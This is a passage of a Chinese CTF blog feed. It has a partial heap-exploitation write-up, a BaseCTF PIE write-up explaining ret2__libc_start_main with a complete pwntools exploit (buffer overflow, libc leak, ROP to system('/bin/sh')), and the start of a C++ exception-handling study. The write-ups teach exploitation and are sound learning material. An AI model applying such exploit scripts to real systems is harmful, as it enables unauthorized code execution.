class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;&#x27;,)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;. Calculate the distance.&quot;</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">vehicle, start, destination, far, note</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(</span><br><span class="line">        <span class="string">b&quot;What kind of transportation do you want? car/train/plane?&quot;</span>, vehicle)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;How far?&quot;</span>, <span class="built_in">str</span>(far).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Note:&quot;</span>, note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">start, destination</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">start, destination</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">start, destination, idx, far, note</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Which one do you want to change?&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;How far?&quot;</span>, <span class="built_in">str</span>(far).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Note:&quot;</span>, note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dj</span>(<span class="params">name</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    r.sendline(name)</span><br></pre></td></tr></table></figure><p>这道题因为开了沙盒，所以程序在初始化的时候就已经申请并且释放了很多堆到tcachebin甚至fastbin中，所以布局的时候需要注意。但是这道题里申请的堆至少是0x520大小的，所以一般情况下其实也不会涉及到tcachebin。</p><h5 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h5><p>这个show函数打印的内容是chunk+8和chunk+0x10两个地方，但是如果free之后，虽然有uaf，但是清空了堆里的城市名字之后，会识别不到相应的chunk，所以必须只能申请了释放掉再申请才能打印，这样一来，chunk+8的位置又被覆盖了。但是如果chunk进入了largebin，就会在chunk+0x10和0x18的地方留下堆地址，这里不会被覆盖。所以只要将chunk+0x10填满8字节就能把0x18处的堆地址带出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">free(<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="string">b&#x27;nanchang&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">show(<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Note:deadbeef&quot;</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heapbase = heap_addr-<span class="number">0x1470</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hex(addr)&quot;</span>, <span class="built_in">hex</span>(heapbase))</span><br></pre></td></tr></table></figure><h5 id="关于edit功能"><a href="#关于edit功能" class="headerlink" title="关于edit功能"></a>关于edit功能</h5><p>edit这里有两个限制，一个是只能edit一次，第二是需要手动赋予edit的机会。第二个限制需要通过Dijkstra算法计算满足总路程超过2000才能有edit机会。所以我们在add的时候还要考虑路径要连得上，并且距离给大一点（不能超过1000）。</p><p>所以在刚刚泄露堆地址的时候就把这个考虑进去，修改一下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">free(<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="string">b&#x27;nanchang&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">show(<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Note:deadbeef&quot;</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heapbase = heap_addr-<span class="number">0x1470</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hex(addr)&quot;</span>, <span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">dj(<span class="string">b&quot;nanchang&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h5><p>泄露完堆地址之后的堆布局长这样（不考虑沙盒开的那堆tcachebin chunk）</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Allocated</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4a470</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x520</span> (with flag bits: <span class="number">0x521</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">Allocated</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4a990</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x530</span> (with flag bits: <span class="number">0x531</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">Allocated</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4aec0</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x530</span> (with flag bits: <span class="number">0x531</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">Top</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4b3f0</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x1ec10</span> (with flag bits: <span class="number">0x1ec11</span>)</span><br></pre></td></tr></table></figure><p>由于show的时候需要查城市名字，所以能想到的泄露libc的方法只有从unsortedbin chunk切割了</p><p>TO BE CONTINUED…</p>]]></content>
    
    
    <summary type="html">卷</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.top/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>记一次简单的ret2libc_start_main分析及利用</title>
    <link href="https://c-lby.top/2024/ret2libc-start-main/"/>
    <id>https://c-lby.top/2024/ret2libc-start-main/</id>
    <published>2024-09-01T04:29:00.000Z</published>
    <updated>2024-09-05T15:26:54.701Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ol><li><p>PIE的概念</p></li><li><p><a href="https://wiki.mrskye.cn/Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_1">有关__libc_start_main的文章</a></p></li></ol><p>不过其实就算没看懂这篇文章问题也不大，只要是题目做多了的话都能知道一点就是，正常gcc编译出来的elf程序都会经历一个<code>_start</code>和<code>__libc_start_main</code>的过程。</p><p>这个阶段在程序里体现为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000010A0                 public _start</span><br><span class="line">.text:00000000000010A0 _start          proc near               ; DATA XREF: LOAD:0000000000000018↑o</span><br><span class="line">.text:00000000000010A0 ; __unwind &#123;</span><br><span class="line">.text:00000000000010A0                 endbr64</span><br><span class="line">.text:00000000000010A4                 xor     ebp, ebp</span><br><span class="line">.text:00000000000010A6                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:00000000000010A9                 pop     rsi             ; argc</span><br><span class="line">.text:00000000000010AA                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:00000000000010AD                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000000010B1                 push    rax</span><br><span class="line">.text:00000000000010B2                 push    rsp             ; stack_end</span><br><span class="line">.text:00000000000010B3                 xor     r8d, r8d        ; fini</span><br><span class="line">.text:00000000000010B6                 xor     ecx, ecx        ; init</span><br><span class="line">.text:00000000000010B8                 lea     rdi, main       ; main</span><br><span class="line">.text:00000000000010BF                 call    cs:__libc_start_main_ptr</span><br><span class="line">.text:00000000000010C5                 hlt</span><br><span class="line">.text:00000000000010C5 ; &#125; // starts at 10A0</span><br><span class="line">.text:00000000000010C5 _start          endp</span><br></pre></td></tr></table></figure><p>这段部分如果翻源码可以发现其实是直接用汇编写的。我们只需要关注一个点，<strong>执行__libc_start_main的时候rdi寄存器里存的是main的地址</strong>。</p><p>紧接着我们来看看<code>__libc_start_main</code>，但是这个程序很长，我们只关注部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000029E33 loc_29E33:                              ; CODE XREF: __libc_start_main+124↓j</span><br><span class="line">.text:0000000000029E33                 mov     rdx, r12</span><br><span class="line">.text:0000000000029E36                 mov     esi, ebp</span><br><span class="line">.text:0000000000029E38                 mov     rdi, r13</span><br><span class="line">.text:0000000000029E3B                 call    sub_29D10</span><br></pre></td></tr></table></figure><p>call了一个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000029D10 ; void __fastcall __noreturn sub_29D10(unsigned int (__fastcall *)(_QWORD, __int64, char **), unsigned int, __int64)</span><br><span class="line">.text:0000000000029D10 sub_29D10       proc near               ; CODE XREF: __libc_start_main+7B↓p</span><br><span class="line">.text:0000000000029D10</span><br><span class="line">.text:0000000000029D10 var_90          = qword ptr -90h</span><br><span class="line">.text:0000000000029D10 var_84          = dword ptr -84h</span><br><span class="line">.text:0000000000029D10 var_80          = qword ptr -80h</span><br><span class="line">.text:0000000000029D10 var_78          = byte ptr -78h</span><br><span class="line">.text:0000000000029D10 var_30          = qword ptr -30h</span><br><span class="line">.text:0000000000029D10 var_28          = qword ptr -28h</span><br><span class="line">.text:0000000000029D10 var_10          = qword ptr -10h</span><br><span class="line">.text:0000000000029D10</span><br><span class="line">.text:0000000000029D10 ; __unwind &#123;</span><br><span class="line">.text:0000000000029D10                 push    rax</span><br><span class="line">.text:0000000000029D11                 pop     rax</span><br><span class="line">.text:0000000000029D12                 sub     rsp, 98h</span><br><span class="line">.text:0000000000029D19                 mov     [rsp+98h+var_90], rdi  &lt;-- 1</span><br><span class="line">.text:0000000000029D1E                 lea     rdi, [rsp+98h+var_78] ; env</span><br><span class="line">.text:0000000000029D23                 mov     [rsp+98h+var_84], esi</span><br><span class="line">.text:0000000000029D27                 mov     [rsp+98h+var_80], rdx</span><br><span class="line">.text:0000000000029D2C                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000029D35                 mov     [rsp+98h+var_10], rax</span><br><span class="line">.text:0000000000029D3D                 xor     eax, eax</span><br><span class="line">.text:0000000000029D3F                 call    _setjmp</span><br><span class="line">.text:0000000000029D44                 endbr64</span><br><span class="line">.text:0000000000029D48                 test    eax, eax</span><br><span class="line">.text:0000000000029D4A                 jnz     short loc_29D97</span><br><span class="line">.text:0000000000029D4C                 mov     rax, fs:300h</span><br><span class="line">.text:0000000000029D55                 mov     [rsp+98h+var_30], rax</span><br><span class="line">.text:0000000000029D5A                 mov     rax, fs:2F8h</span><br><span class="line">.text:0000000000029D63                 mov     [rsp+98h+var_28], rax</span><br><span class="line">.text:0000000000029D68                 lea     rax, [rsp+98h+var_78]</span><br><span class="line">.text:0000000000029D6D                 mov     fs:300h, rax</span><br><span class="line">.text:0000000000029D76                 mov     rax, cs:environ_ptr</span><br><span class="line">.text:0000000000029D7D                 mov     edi, [rsp+98h+var_84]</span><br><span class="line">.text:0000000000029D81                 mov     rsi, [rsp+98h+var_80]</span><br><span class="line">.text:0000000000029D86                 mov     rdx, [rax]</span><br><span class="line">.text:0000000000029D89                 mov     rax, [rsp+98h+var_90]  &lt;-- 2</span><br><span class="line">.text:0000000000029D8E                 call    rax  &lt;-- 3</span><br><span class="line">.text:0000000000029D90                 mov     edi, eax</span><br><span class="line">.text:0000000000029D92</span><br><span class="line">.text:0000000000029D92 loc_29D92:                              ; CODE XREF: sub_29D10+AA↓j</span><br><span class="line">.text:0000000000029D92                 call    exit</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>其实这个函数就是pwndbg里显示的<code>__libc_start_call_main</code>。关注标注出来的几行可以发现rdi最后是被传入rax后被call了，才正式进入了main函数开始执行程序流程。换个角度来看，main函数的返回地址就是<code>mov edi,eax</code>那一行，紧接着就exit了。</p><h3 id="BaseCTF-week3-PIE题目分析"><a href="#BaseCTF-week3-PIE题目分析" class="headerlink" title="BaseCTF week3  PIE题目分析"></a>BaseCTF week3  PIE题目分析</h3><p>题目其实非常简单，也很简短。开了PIE保护。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you said %s&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个溢出，一次打印。问题在于这题既没有后门，也没有说把溢出放在一个子函数里，而是放在了main函数，那就导致了其返回地址是一个libc地址，没法直接部分写返回main。因为只有一次机会，没法做到同时泄露地址又写进去一个地址，所以也只有可能用部分写了。所以考虑用<code>ret2__libc_start_main</code>来重启main函数。</p><p>一开始调试看到返回地址是<code>__libc_start_call_main+128</code>（0x29D90），所以就想着我要不直接把那个地址减去108，然后填回去（0x29D10），刚好只有最后一个字节改变了。但是发现打不通，最后会卡在movaps。然后尝试绕过第一个push指令，还是不行，rax是非法地址。</p><p>然后尝试填<code>__libc_start_main</code>的首地址（0x29DC0），依然是上面两个问题。所以我就打开libc文件来看汇编了，发现<code>__libc_start_call_main</code>这个函数前半部分基本上都是在进行寄存器状态的保存。后面尝试了几次发现最后一个字节从1e到89都是可以用来打通的。所以开始找原因，于是就有了上面前置知识那样的分析。</p><p>其实最大的问题也就发生在那个rdi身上，如果他存着main的函数地址，那么main是可以被正常启动的。但是很显然程序不会无缘无故把main函数存到rdi里。所以如果跳过保存rdi到栈上那一步就能够正常运行了。</p><p>能正常运行意味着，栈上对应位置确实存着main的函数地址，这是怎么回事呢？我们动调看看。</p><p><img src="https://c-lby.top/images/ret2libc_start_main/%E6%A0%88%E8%BF%98%E5%8E%9F.png" alt="栈还原"></p><p>程序从rsp+8处取main地址，栈刚好满足。这是因为main函数执行之前就存在过__libc_start_main函数的栈帧，而main函数正常返回也会回到这个栈帧里来。换句话说，只要我在之前的操作中没有破坏到这个地方，那么函数就能正常从栈中取到main地址，从而实现重启main函数。</p><p>那这道题下面就很简单，因为可以实现重启main，那我们就可以利用第一次printf覆盖\x00带出libc地址，然后获取libc基址，第二次回到main函数的时候再ROP执行binsh即可。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = remote(&#x27;challenge.basectf.fun&#x27;, 35787)</span></span><br><span class="line">r = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># e = ELF(&#x27;./vuln&#x27;)</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+<span class="string">b&#x27;\x1e&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *$rebase(0x123e)&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x29d1e</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">rdi = libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">ret = libc_base+<span class="number">0x29139</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(rdi)+p64(binsh_addr)+p64(ret)+p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">BaseCTF week3 PWN PIE</summary>
    
    
    
    <category term="ret2__libc_start_main" scheme="https://c-lby.top/categories/ret2-libc-start-main/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="ROP" scheme="https://c-lby.top/tags/ROP/"/>
    
  </entry>
  
  <entry>
    <title>C++异常处理机制及其利用研究</title>
    <link href="https://c-lby.top/2024/cpp-exception/"/>
    <id>https://c-lby.top/2024/cpp-exception/</id>
    <published>2024-08-28T06:14:49.000Z</published>
    <updated>2024-08-28T21:56:05.004Z</updated>
    
    <content type="html"><![CDATA[<h3 id="自己的理解与尝试"><a href="#自己的理解与尝试" class="headerlink" title="自己的理解与尝试"></a>自己的理解与尝试</h3><h4 id="编写demo看执行结果"><a href="#编写demo看执行结果" class="headerlink" title="编写demo看执行结果"></a>编写demo看执行结果</h4><p><a href="https://www.cnblogs.com/catch/p/3604516.html">参考资料</a>然后根据资料里的demo自己改了一下看看实际try…catch是怎么运行的</p><h5 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func3 start&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">throw</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func3&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">test_func3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (<span class="type">int</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;catch 2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func2 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test func1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">test_func2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (...)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;catch 1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;func1 exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">test_func1</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;main exit&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 